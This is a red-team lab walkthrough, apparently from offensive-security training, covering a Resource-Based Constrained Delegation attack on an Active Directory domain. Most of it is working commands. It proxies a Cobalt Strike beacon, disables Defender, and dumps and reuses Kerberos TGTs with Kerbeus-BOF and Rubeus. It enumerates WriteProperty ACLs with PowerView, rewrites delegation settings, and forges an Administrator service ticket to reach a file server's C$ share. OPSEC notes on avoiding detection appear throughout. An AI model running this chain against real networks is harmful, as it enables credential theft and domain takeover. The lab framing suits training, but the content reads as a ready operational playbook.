# Resource Based Constrained Delegation Lab

>The objective of this lab is to combine a `WriteProperty` privilege and Resource-Based Constrained Delegation (RBCD) to compromise a computer.  

===

## SOCKS

1. Launch Cobalt Strike and connect to the team server.  
2. Interact with a Beacon and start a socks proxy. User `pchilds` beacon.  
   `socks 1080 socks5`  
3. From the Windows start menu, launch `Profixier`.  
4. It opens minimised in the taskbar, so click it to open the full window.  

### Proxy Server  

>Add the team server as a new proxy server:  
    1. **Profile > Proxy Servers**  
    2. Click **Add**.  
    3. Address of the Cobalt Strike server:  `10.0.0.5`  
    4. Port:  `1080`  
    5. Protocol: **SOCKS Version 5**  
    6. Click **OK**.  
    
⚠️ A box will appear asking if you want to use this proxy by default. Click **No**.  

>Click **OK** again.  
    
⚠️ Another box will appear asking if you want to edit `Proxification Rules`.  Click **Yes**.  

### Proxification Rules  

>Add a new rule that will proxy any traffic from any application, on any port destined for the target network, through the team server.
    1. Click **Add**.
    2. Name:  `Beacon Network Route Rule`
    3. Target hosts:  `10.10.120.0/23`
    4. Action: **Proxy SOCKS5 10.0.0.5**
    5. Click **OK**.
    6. Click **OK** again.

### DNS

1. Run Terminal as an **administrator**.
2. Add static DNS records for `lon-dc-1` and `contoso.com` on attacker desktop to allow proxychain commands to resolve remote hostnames.

```PowerShell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

### Defender

1. Still in the admin Terminal session, on the attacker desktop machine, disable real-time Microsoft Defender Antivirus 🛡️  
   `Set-MpPreference -DisableRealtimeMonitoring $true`  

### Current User TGT Credentials

>TGT delegation in low integrity beacon as user `pchilds`  
>Obtain TGT for the current user running the beacon.  

⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  
>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  

1. In the medium-integrity Beacon running as `pchilds`, extract current users TGT.  
    `krb_tgtdeleg`
    
2. Copy the returned base64 TGT ticket to clipboard.  

3. On the Attacker desktop, run a netonly process, that opens new PowerShell window.  
    `runas /netonly /user:CONTOSO\pchilds powershell`  

* Enter any fake password.
    
4. Request a service ticket for LDAP through the proxy, in the new **spawned** PowerShell window and paste the above returned based64 TGT ticket in the `Rubeus` command:  

```Terminal-nocolor
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
```

>Setup done.  

===

## Enumeration

1. Import PowerView module. Confirm antivirus real-time is disabled to not prevent loading `PowerView.ps1` 🛡️
   `ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1`

2. Find principals that have *WriteProperty* privileges on the *msDS-AllowedToActOnBehalfOfOtherIdentity* attribute of computers.

```PowerShell
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```

⚠️ This will show that a principal ending in RID 1107 has this privilege over multiple computers.🔍

3. Query LDAP to discover what this SID is if a user, computer or group, etc.

```PowerShell
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
```

⚠️ This will show that it's a domain group called "Server Admins", and that *rsteel* is a member.🔍

4. Go back to Cobalt Strike and use the high-integrity Beacon running in 🔥SYSTEM beacon to dump 🗝️ the TGT for rsteel.

```
krb_triage
```
    
> ⚠️ Lab-confirmed (2026-04-19): LUID varies per session — do NOT hardcode `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
    
```
krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
```
    
    > OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API. No raw LSASS read.
    > ⚠️ Use `/luid:1e7efb` NOT `/luid:0x1e7efb` — Kerbeus-BOF rejects 0x prefix ("Invalid luid").
    
5. Before using the above output base64 ticket for `rsteal` we need to purge `pchilds`. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.

```PowerShell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
```

6. Request a new LDAP service ticket with `rsteel` TGT, and paste in rsteel TGT base64 ticket given us LDAP tgt ticket.

```PowerShell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
```

===

## RBCD Exploitation

1. Sanity check for any existing RBCD configurations.

>From Attacker Desktop, running proxifier, execute in powershell where PowerView module imported:  
```PowerShell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

⚠️ LON-FS-1 already has LON-WS-1 as an existing RBCD delegate. **Do NOT overwrite** — add alongside the existing entry (see step 2).

2. Add a new RBCD config between *lon-fs-1* and *lon-wkstn-1*, making sure not to overwrite the existing entry.❗

```PowerShell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
```

> ⚠️ Critical: pass **both** `$ws1,$wkstn1` to preserve the existing LON-WS-1 entry. Using only `$wkstn1` would remove LON-WS-1. Lab-confirmed result: `LON-FS-1: {LON-WS-1, LON-WKSTN-1}`.

3. Still on Attacker Desktop, in powershell, Verify that both `lon-ws-1` and `lon-wkstn-1` are present.
  
```PowerShell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

4. Go back to Cobalt Strike beacon, and dump 🗝️  TGT for *lon-wkstn-1* from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  

```
krb_dump /luid:3e7 /service:krbtgt
```
    
> OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.  
> ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
    
5. Back in Powershell session on Attacker Desktop, Use above raw base64 TGT ticket output, copy to clipboard.  
>Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.  
  
```PowerShell-nocolor
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
```

> OPSEC-🟢SAFE — Rubeus runs on the attacker desktop, not via beacon, files written locally only to Attacker desktop.  
**Attacker desktop is not monitored by SOC blue team.**  

> ⚠️ Rubeus `/outfile` with a **directory path** auto-names the files:
> - S4U2self ticket: `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`
> - S4U2proxy cifs ticket: `_cifs_lon-fs-1`
> 
> The file you need for `kerberos_ticket_use` is `_cifs_lon-fs-1` (no extension). 
> Copy the exact filename from Rubeus output line:
> `[*] Ticket written to C:\Users\Attacker\Desktop\_cifs_lon-fs-1`

6. Use the ticket file output to attacker desktop to list the C$ share content on `lon-fs-1`.

```cs
// skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
ls \\lon-fs-1\c$
```

> ⚠️ 🔥 make_token was **not needed** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.

Cleanup — revoke token and purge ticket:

```cs
rev2self
kerberos_ticket_purge
```  
    
7. On the Attacker Desktop, restore the RBCD configuration back to how it was.

```PowerShell
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

⚠️ In this lab, you have learned how to leverage a `WriteProperty` primitive with RBCD to compromise a computer.
